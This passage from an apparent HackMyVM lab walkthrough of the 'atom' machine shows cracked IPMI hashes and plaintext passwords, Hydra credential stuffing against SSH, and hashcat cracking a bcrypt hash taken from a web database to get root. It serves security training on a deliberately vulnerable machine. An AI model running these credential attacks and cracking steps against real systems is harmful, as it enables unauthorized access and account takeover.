192.168.0.145 jerrilee:6c68fc97101b00009e7646f10a5bc811d71eebaf70272423400c16a9f1512e4c334c25096412224ca123456789abcdefa123456789abcdef14086a657272696c6565:0dce6b1e4345679d43faf0c0dd8c36df6fada53e:number17
192.168.0.145 glynn:4ac0db4e921b0000cd3702589448d8eed17ef6b65502f1e5ec4ebaf4841a86a3ea0164d1879de3c0a123456789abcdefa123456789abcdef1405676c796e6e:c6b6c5d7909de3dfaaf68a92ab10a73e50173677:evan
192.168.0.145 asia:44c61ed7141c0000df0ea845cc582d5c6bc856f5a63d3e228b7a7050cfca277e0a37285068cc1691a123456789abcdefa123456789abcdef140461736961:773a5cb28a2413c514338eeff507037638f053ed:TWEETY1
192.168.0.145 zaylen:7ba2e804961c00006e42f0127b28bb0ce47acc69e59e8b23ebcf670b5e35e0d269afa53904376ff9a123456789abcdefa123456789abcdef14067a61796c656e:4ef4e9dc39093dcaa88e7c3e49fc9b43212020e8:120691
192.168.0.145 fabien:ccd1a6f6181d0000c5a4abfa80f3cef41809722caabbfa95870b0db81fc306db414342b95f03674aa123456789abcdefa123456789abcdef140666616269656e:206c5429f629cc53805498cb380fadd47be9b53f:chatroom
192.168.0.145 merola:518063379a1d000060a4e61c5d06849be77afac7a85a46aedd0e1ed6fe24b13efee3f92b5adc35c2a123456789abcdefa123456789abcdef14066d65726f6c61:e486e37cd739c2bcb87f8006a22e4f5152c3c849:mackenzie2
192.168.0.145 jem:316e10761c1e00003e35bd790a242e539f188b73a3603057df2407473098c8dab3d28fbe8411bb2ea123456789abcdefa123456789abcdef14036a656d:cf96a256b28a78ad5e9974641826c46bd405e0f3:081704
192.168.0.145 riyaz:259b5dbf9e1e0000e003c2f0dd5626e056f7cf3158bc192a2f301c3556bc5025c4cc4d1a715338e0a123456789abcdefa123456789abcdef1405726979617a:824f0225350bc678c1b043abbe126a22de6c49fb:djones
192.168.0.145 laten:198c72d5201f0000d0b4bca79daeeb035b5f2eebb993ba966df4d1746e684adf748bd9a50e1d778fa123456789abcdefa123456789abcdef14056c6174656e:29039a6397e1498746993c74905b5844a1ad9d88:trick1
192.168.0.145 cati:377da1baa21f00007e154d8411f9e2007c7339597395c58b82d18d08170e4b2b173e4167e1723461a123456789abcdefa123456789abcdef140463617469:d8cb72a74c2b1b7a904f291427a27171ff7ce421:122987
192.168.0.145 rozalia:37121dc42420000061d3c767ddb31d37fed9b858f486fa292275a0d23d181af466a31c26c4139855a123456789abcdefa123456789abcdef1407726f7a616c6961:df3699f2e664aa114ab598d8f58e2c92a9088c6f:batman!
192.168.0.145 palmer:3d91ab5aa62000009ae3a857cdc839d060e9d0cc206dddb314979c7d29037e46ba7dea6aacef908ea123456789abcdefa123456789abcdef140670616c6d6572:53e418b1a15ab1f31f76536124d685988245ec0b:phones
192.168.0.145 onida:ac030c952821000072027e7abc997a3b0ee0b27a34c44a5540579ef75c701759464ab06e691abb1ba123456789abcdefa123456789abcdef14056f6e696461:e8c96b3e75bbecf8db963c380ddb5714f774343a:jiggaman
192.168.0.145 terra:c8cf2052aa210000672f7159aa011a073051736c7322788537f60454c4e0dee7ca408b3a7186b899a123456789abcdefa123456789abcdef14057465727261:169272ac7b7565f17eef45bb8de4648e48281108:sexymoma
192.168.0.145 ranga:9a0122872c2200006212bf7df74ca7693cab29d46d43e9ccc7629a9fd65f3ffd95a87967f96a0fa4a123456789abcdefa123456789abcdef140572616e6761:a22e47aa75e1f9721e26205ba74a5ce5914db6f4:jaffa1
192.168.0.145 harrie:b3404360ae2200009844ea243c15c2e8f9ef0899b7feea6910ae372801c8aec1fd29cb01331c8954a123456789abcdefa123456789abcdef1406686172726965:985aad5ca76b77124dd73780a0b13c3cbb5425d9:071590
192.168.0.145 pauly:454fe80e30230000eb86104c90214c2c3926426bb31f80d3a3ff844406f70e6b9e51475950416726a123456789abcdefa123456789abcdef14057061756c79:ee7d616f35dd4809cab87e9835d8d5b29e63f513:515253
192.168.0.145 els:0fab0444b22300006af79ab70c73953ee27cc94441451e18f12d0382010429e8b50ba05968330e09a123456789abcdefa123456789abcdef1403656c73:3d705f1109c945d3a33fd226158ad0b12eab6761:dezzy
192.168.0.145 bqb:8e0ac69f34240000705d6b6bd8643d4746452adf217530dece3194a23e9333f123cc94c689e8ec71a123456789abcdefa123456789abcdef1403627162:553f9806e3aaf57f03b806c727ee7c32c3f078cf:290992
192.168.0.145 karlotte:222da626b624000043650a8011e6e0df6605cef7e7728cae14ea3ec69b295c4549122d5b0bfb1ccfa123456789abcdefa123456789abcdef14086b61726c6f747465:3f60520b4cc23785ba80ea2938b73879cc1c7a21:emeralds
192.168.0.145 zali:1cc523df3825000015da1b7e7109fccb8535a98606cd9545eb6c1feeaa6cae092b091c4f38b963e2a123456789abcdefa123456789abcdef14047a616c69:637f0ca3423420f25c0a4ec7b68370883da7ac73:poynter
192.168.0.145 ende:6c5831b2ba250000b9bb9470c58c497d6ded8b5c4e15f211eb85caf7bb50b48a729fcf4567f5c059a123456789abcdefa123456789abcdef1404656e6465:7f7cdddbd0d60dc5b3ea768f0f94921e1172f92c:tripod
192.168.0.145 stacey:bf0ead8d3c2600001515eaf5d33c9c4c43c687ba32d7b030e1a1028d03b27bfeda512433df919324a123456789abcdefa123456789abcdef1406737461636579:d1916b6f2d54b79a40cabb7170fd285722987cc3:castillo1
192.168.0.145 shirin:7fb9146ebe260000d17d833bb518a74ff0a511805c97924deb51efe420c6b063ac9aed6122ce714fa123456789abcdefa123456789abcdef140673686972696e:88ff3b95be12e43494627f503dfea9e0f3141b9b:kittyboo
192.168.0.145 kaki:7016c1f940270000743777992cea187da86338bf802de2b9964f9c67f313d2082ec646893f3dd357a123456789abcdefa123456789abcdef14046b616b69:a11056704ead3b102e115683363b3f3387dab94d:numberone
192.168.0.145 saman:7b73e16fc2270000f847030795994ed6ecea4b0f1ebc6e9441cd1b01bbfaf4b99953201049595c7da123456789abcdefa123456789abcdef140573616d616e:9469e864e47703ff5241315fb500016d9d705acc:090506
192.168.0.145 kalie:9980b35644280000d58a1ba96a778c96d0a1b1e14bccfec0fcb9d6313be13a7b699ecf1535654a9fa123456789abcdefa123456789abcdef14056b616c6965:62dd5192db2ed5172d35fd911a72eb26d51ae912:billandben
192.168.0.145 deshawn:6867d5e6c628000050fc601e81774e7651c73c263627ae866e6820dfb756f043d7180df363edc015a123456789abcdefa123456789abcdef14076465736861776e:dd5efe43406af27e5ad991792ff41cd526b784f1:milo123
192.168.0.145 mayeul:4e345c2948290000f845aa4beea4deb884eafdebeb6a151ceef690c5150369b14c12c2d4d10bae37a123456789abcdefa123456789abcdef14066d617965756c:5cfa081f152b51e52ec95d910bfdd72614d915b5:241107
```

The file was cleared up further to only display the usernames and password:

```bash
garffff@garffff:~/hackmyvm/atom$ cat ipmi_cracked.txt | awk '{print $2}' | cut -d ":" -f 1,4 | tee pass.txt
admin:cukorborso
analiese:honda
briella:jesus06
richardson:darell
carsten:2468
sibylle:me4life
wai-ching:10101979
jerrilee:number17
glynn:evan
asia:TWEETY1
zaylen:120691
fabien:chatroom
merola:mackenzie2
jem:081704
riyaz:djones
laten:trick1
cati:122987
rozalia:batman!
palmer:phones
onida:jiggaman
terra:sexymoma
ranga:jaffa1
harrie:071590
pauly:515253
els:dezzy
bqb:290992
karlotte:emeralds
zali:poynter
ende:tripod
stacey:castillo1
shirin:kittyboo
kaki:numberone
saman:090506
kalie:billandben
deshawn:milo123
mayeul:241107
```

### Bruteforcing Using Hydra

Hydra was used against the SSH service in the attempt to find valid credentials:

```bash
garffff@garffff:~/hackmyvm/atom$ hydra -C pass.txt 192.168.0.145 ssh -V
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-30 20:19:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries, ~3 tries per task
[DATA] attacking ssh://192.168.0.145:22/
[ATTEMPT] target 192.168.0.145 - login "admin" - pass "cukorborso" - 1 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.0.145 - login "analiese" - pass "honda" - 2 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.0.145 - login "briella" - pass "jesus06" - 3 of 36 [child 2] (0/0)
[ATTEMPT] target 192.168.0.145 - login "richardson" - pass "darell" - 4 of 36 [child 3] (0/0)
[ATTEMPT] target 192.168.0.145 - login "carsten" - pass "2468" - 5 of 36 [child 4] (0/0)
[ATTEMPT] target 192.168.0.145 - login "sibylle" - pass "me4life" - 6 of 36 [child 5] (0/0)
[ATTEMPT] target 192.168.0.145 - login "wai-ching" - pass "10101979" - 7 of 36 [child 6] (0/0)
[ATTEMPT] target 192.168.0.145 - login "jerrilee" - pass "number17" - 8 of 36 [child 7] (0/0)
[ATTEMPT] target 192.168.0.145 - login "glynn" - pass "evan" - 9 of 36 [child 8] (0/0)
[ATTEMPT] target 192.168.0.145 - login "asia" - pass "TWEETY1" - 10 of 36 [child 9] (0/0)
[ATTEMPT] target 192.168.0.145 - login "zaylen" - pass "120691" - 11 of 36 [child 10] (0/0)
[ATTEMPT] target 192.168.0.145 - login "fabien" - pass "chatroom" - 12 of 36 [child 11] (0/0)
[ATTEMPT] target 192.168.0.145 - login "merola" - pass "mackenzie2" - 13 of 36 [child 12] (0/0)
[ATTEMPT] target 192.168.0.145 - login "jem" - pass "081704" - 14 of 36 [child 13] (0/0)
[ATTEMPT] target 192.168.0.145 - login "riyaz" - pass "djones" - 15 of 36 [child 14] (0/0)
[ATTEMPT] target 192.168.0.145 - login "laten" - pass "trick1" - 16 of 36 [child 15] (0/0)
[ATTEMPT] target 192.168.0.145 - login "cati" - pass "122987" - 17 of 36 [child 4] (0/0)
[ATTEMPT] target 192.168.0.145 - login "rozalia" - pass "batman!" - 18 of 36 [child 11] (0/0)
[ATTEMPT] target 192.168.0.145 - login "palmer" - pass "phones" - 19 of 36 [child 2] (0/0)
[RE-ATTEMPT] target 192.168.0.145 - login "onida" - pass "122987" - 19 of 36 [child 4] (0/0)
[ATTEMPT] target 192.168.0.145 - login "onida" - pass "jiggaman" - 20 of 36 [child 1] (0/0)
[RE-ATTEMPT] target 192.168.0.145 - login "terra" - pass "batman!" - 20 of 36 [child 11] (0/0)
[ATTEMPT] target 192.168.0.145 - login "terra" - pass "sexymoma" - 21 of 36 [child 10] (0/0)
[22][ssh] host: 192.168.0.145   login: onida   password: jiggaman
[ATTEMPT] target 192.168.0.145 - login "ranga" - pass "jaffa1" - 22 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.0.145 - login "harrie" - pass "071590" - 23 of 36 [child 12] (0/0)
[ATTEMPT] target 192.168.0.145 - login "pauly" - pass "515253" - 24 of 36 [child 7] (0/0)
[ATTEMPT] target 192.168.0.145 - login "els" - pass "dezzy" - 25 of 36 [child 5] (0/0)
[ATTEMPT] target 192.168.0.145 - login "bqb" - pass "290992" - 26 of 36 [child 15] (0/0)
[ATTEMPT] target 192.168.0.145 - login "karlotte" - pass "emeralds" - 27 of 36 [child 3] (0/0)
[ATTEMPT] target 192.168.0.145 - login "zali" - pass "poynter" - 28 of 36 [child 8] (0/0)
[RE-ATTEMPT] target 192.168.0.145 - login "ende" - pass "poynter" - 28 of 36 [child 8] (0/0)
[ATTEMPT] target 192.168.0.145 - login "ende" - pass "tripod" - 29 of 36 [child 9] (0/0)
[ATTEMPT] target 192.168.0.145 - login "stacey" - pass "castillo1" - 30 of 36 [child 13] (0/0)
[RE-ATTEMPT] target 192.168.0.145 - login "shirin" - pass "castillo1" - 30 of 36 [child 13] (0/0)
[ATTEMPT] target 192.168.0.145 - login "shirin" - pass "kittyboo" - 31 of 36 [child 6] (0/0)
[ATTEMPT] target 192.168.0.145 - login "kaki" - pass "numberone" - 32 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.0.145 - login "saman" - pass "090506" - 33 of 36 [child 14] (0/0)
[ATTEMPT] target 192.168.0.145 - login "kalie" - pass "billandben" - 34 of 36 [child 2] (0/0)
[ATTEMPT] target 192.168.0.145 - login "deshawn" - pass "milo123" - 35 of 36 [child 12] (0/0)
[RE-ATTEMPT] target 192.168.0.145 - login "mayeul" - pass "milo123" - 35 of 36 [child 12] (0/0)
[RE-ATTEMPT] target 192.168.0.145 - login "mayeul" - pass "milo123" - 35 of 36 [child 12] (0/0)
[ATTEMPT] target 192.168.0.145 - login "mayeul" - pass "241107" - 36 of 36 [child 4] (0/0)
[RE-ATTEMPT] target 192.168.0.145 - login "mayeul" - pass "milo123" - 36 of 36 [child 12] (0/0)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-30 20:19:10
```

A match was found:

```bash
onida:jiggaman
```

Using these credentials, it was possible to log into SSH and obtain the user flag:

```bash
garffff@garffff:~/hackmyvm/atom$ ssh onida@192.168.0.145
onida@192.168.0.145's password: 
Linux atom 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
onida@atom:~$ whoami && id
onida
uid=1000(onida) gid=1000(onida) groups=1000(onida),100(users)
onida@atom:~$ ls -lash
total 24K
4.0K drwx------ 2 onida onida 4.0K Dec 31  2400 .
4.0K drwxr-xr-x 3 root  root  4.0K May 24 13:55 ..
   0 lrwxrwxrwx 1 root  root     9 May 24 14:16 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 onida onida  220 Dec 31  2400 .bash_logout
4.0K -rw-r--r-- 1 onida onida 3.5K Dec 31  2400 .bashrc
4.0K -rw-r--r-- 1 onida onida  807 Dec 31  2400 .profile
4.0K -rwx------ 1 onida onida   33 Dec 31  2400 user.txt
onida@atom:~$ cat user.txt 
f75390001fa2fe806b4e3f1e5dadeb2b
```

### Privilege Escalation

Looking in the `/var/www/html/` directory, there is a SQLite DB file. Inspecting the file reveals a hash:

```bash
onida@atom:~$ cd /var/www/html/
onida@atom:/var/www/html$ ls -lash
total 172K
4.0K drwxr-xr-x 6 www-data www-data 4.0K May 27 15:21 .
4.0K drwxr-xr-x 3 root     root     4.0K May 25 22:19 ..
116K -rwxr-xr-x 1 www-data www-data 112K May 27 15:21 atom-2400-database.db
4.0K drwxr-xr-x 2 www-data www-data 4.0K Dec 31  2400 css
4.0K drwxr-xr-x 4 www-data www-data 4.0K Dec 31  2400 img
 12K -rw-r--r-- 1 www-data www-data  12K Dec 31  2400 index.php
4.0K drwxr-xr-x 2 www-data www-data 4.0K Dec 31  2400 js
8.0K -rw-r--r-- 1 www-data www-data 6.2K Dec 31  2400 login.php
4.0K -rwxr-xr-x 1 www-data www-data 1.6K Dec 31  2400 profile.php
8.0K -rw-r--r-- 1 www-data www-data 5.5K Dec 31  2400 register.php
4.0K drwxr-xr-x 2 www-data www-data 4.0K Dec 31  2400 video
onida@atom:/var/www/html$ strings atom-2400-database.db 
SQLite format 3
mtableusersusers
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL
indexsqlite_autoindex_users_1users
tablelogin_attemptslogin_attempts
CREATE TABLE login_attempts (
    id INTEGER PRIMARY KEY,
    ip_address TEXT NOT NULL,
    attempt_time INTEGER NOT NULL
atom$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm
	atom
```

The hash was identified as `bcrypt`:

```bash
garffff@garffff:~/hackmyvm/atom$ hashid -m hash.txt 
--File 'hash.txt'--
Analyzing '$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
--End of file 'hash.txt'--
```

It was then possible to crack the hash using Hashcat:

```bash
garffff@garffff:~/hackmyvm/atom$ echo '$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm' > hash.txt
garffff@garffff:~/hackmyvm/atom$ hashcat  -m 3200 hash.txt /opt/rockyou.txt 
hashcat (v6.2.6-707-g91095845b) starting

Successfully initialized the NVIDIA main driver CUDA runtime library.

Failed to initialize NVIDIA RTC library.

* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
             CUDA SDK Toolkit required for proper device support and utilization.
             For more information, see: https://hashcat.net/faq/wrongdriver
             Falling back to OpenCL runtime.

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL API (OpenCL 3.0 CUDA 12.2.148) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: NVIDIA GeForce GTX 1080 Ti, 10112/11164 MB (2791 MB allocatable), 28MCU

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
=====================================================================================================================================
* Device #2: pthread-Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 84 MB

Dictionary cache built:
* Filename..: /opt/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm:madison
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7p...2fH9Cm
Time.Started.....: Tue Jul 30 20:26:10 2024 (1 sec)
Time.Estimated...: Tue Jul 30 20:26:11 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      882 H/s (10.80ms) @ Accel:2 Loops:16 Thr:11 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 616/14344384 (0.00%)
Rejected.........: 0/616 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> kathleen
Hardware.Mon.#1..: Temp: 63c Fan: 28% Util:100% Core:1923MHz Mem:5005MHz Bus:16

Started: Tue Jul 30 20:26:03 2024
Stopped: Tue Jul 30 20:26:12 2024
```

Found password:

```bash
garffff@garffff:~/hackmyvm/atom$ hashcat  -m 3200 hash.txt --show
$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm:madison
```

The found password was used to switch to the root user, and the root flag was obtained: 

```bash
onida@atom:/var/www/html$ su root
Password: 
root@atom:/var/www/html# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
root@atom:/var/www/html# cd /root
root@atom:~# ls -lash
total 32K
4.0K drwx------  4 root root 4.0K May 27 15:43 .
4.0K drwxr-xr-x 18 root root 4.0K May 24 14:18 ..
   0 lrwxrwxrwx  1 root root    9 Mar  9 14:31 .bash_history -> /dev/null
4.0K -rw-r--r--  1 root root  571 Dec 31  2400 .bashrc
4.0K -rw-------  1 root root   20 May 27 14:15 .lesshst
4.0K drwxr-xr-x  3 root root 4.0K Dec 31  2400 .local
4.0K -rw-r--r--  1 root root  161 Dec 31  2400 .profile
4.0K -rw-r--r--  1 root root   33 Dec 31  2400 root.txt
4.0K drwx------  2 root root 4.0K Dec 31  2400 .ssh
root@atom:~# cat root.txt
d3a4fd660f1af5a7e3c2f17314f4a962
```




